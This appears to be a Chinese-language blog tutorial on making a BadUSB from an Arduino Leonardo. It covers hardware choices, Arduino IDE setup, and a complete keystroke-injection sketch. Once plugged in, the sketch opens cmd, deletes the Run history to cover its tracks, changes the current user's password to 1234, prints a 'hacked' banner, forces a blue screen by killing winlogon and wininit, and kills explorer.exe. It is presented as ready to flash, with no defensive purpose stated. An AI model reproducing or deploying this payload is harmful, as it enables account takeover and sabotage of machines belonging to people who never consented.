# 疯狂的极客--制作BadUSB

 2022-05-30 18:28:42

#### 文章目录

- [设备](https://blog.csdn.net/Peter_FHC/article/details/125051649?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~PaidSort-1-125051649-blog-125362082.235^v43^pc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~PaidSort-1-125051649-blog-125362082.235^v43^pc_blog_bottom_relevance_base5&utm_relevant_index=1#_5)
- [软件](https://blog.csdn.net/Peter_FHC/article/details/125051649?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~PaidSort-1-125051649-blog-125362082.235^v43^pc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~PaidSort-1-125051649-blog-125362082.235^v43^pc_blog_bottom_relevance_base5&utm_relevant_index=1#_12)
- [编写代码（重点）](https://blog.csdn.net/Peter_FHC/article/details/125051649?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~PaidSort-1-125051649-blog-125362082.235^v43^pc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~PaidSort-1-125051649-blog-125362082.235^v43^pc_blog_bottom_relevance_base5&utm_relevant_index=1#_25)



## 设备

1、 能够制作badusb的几种常见载体有：Arduino Leonardo、Phison、Teensy、Attiny85、PS2303（芯片）、RUBBER DUCKY等。从专业程度和易用性来讲，RUBBER DUCKY最优（Hak5官方提供了许多现成的按键脚本和[payload](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)），但价格也最贵。

2、 一台计算机

![](https://minioapi.nerubian.cn/image/20250120140744136.png)

## 软件

下载Arduino开发者工具——Arduino IDE (用来向leonardo烧录程序的软件)
这里是Arduino IDE下载地址：https://www.arduino.cc/en/software.
下载安装较为简单，这里不再赘述。安装后打开软件，你将看到如下所示的界面图：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/be09ca2126760c7997ebdafafe77f365.png)

打开工具-开发板-开发板管理器
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7ecf4498062823d2a5d0ec7eb755c41a.png)
联网安装Arduino AVR Boards板子：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/92c3b72aa291639601fd143ea96d1675.png)
回到主界面，开发板选择，选择工具-开发板- Arduino Leonardo。编程器选择，AVRISP mkII，如下图所示
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8b0df3f7c28c06c6e2f6f456cadc553d.png)

## 编写代码（重点）

**前面的准备倒不难，关键是你要实现什么样的功能。**
这里有个快速编写命令的工具：Automator
这里附上GitHub上的下载地址：https://github.com/Catboy96/Automator

这里附上一个更改用户的密码、显示蓝屏的代码：

```c
#include<Keyboard.h>
void setup() 
{
  //初始化
  Keyboard.begin();//开始键盘通讯
  delay(5000);//延时
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);//win键
  delay(200);
  Keyboard.press('r');//r键
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("cmd.exe");
  delay(200);
  Keyboard.println("CMD.EXE /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&NET USER %USERNAME% 1234");//修改密码1234
  delay(200);
  Keyboard.println("color a");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ........................................................ >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("echo ## ## ### ###### ## ## ######## ######## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 0");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ## ## ## ## ## ## ## ## ## ## ## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 1");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ## ## ## ## ## ## ## ## ## ## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 2");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ######### ## ## ## ##### ###### ## ## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 3");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ## ## ######### ## ## ## ## ## ## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 4");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ## ## ## ## ## ## ## ## ## ## ## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 5");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ## ## ## ## ###### ## ## ######## ######## >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color 6");//更改命令行颜色（绿色）
  delay(200);
  Keyboard.println("echo ........................................................ >> hacked.txt");//向hacked.txt写内容
  delay(200);
  Keyboard.println("color c");//更改命令行颜色（红色）
  delay(200);
   Keyboard.println("cls");//更改命令行颜色（红色）
  delay(200);
  Keyboard.println("type hacked.txt");//将hacked.txt文件内容打印在cmd
  delay(200);
  Keyboard.println("CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1>NUL 2>NUL&TASKKILL /F /IM WININIT.EXE 2>NUL");//蓝屏XP、7
  delay(200);
  Keyboard.println("taskkill /f /im explorer.exe");//删除桌面进程(all)
  delay(200);
  Keyboard.end();//结束键盘通讯
 
}
void loop()//循环
{

}
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970
```

写好代码后，点击左上角的那个对号进行编译，没有报错信息一般就是成功了。最后,插上你的usb，点击左上角第二个箭头符号进行上传，等待个几十秒就成功了。

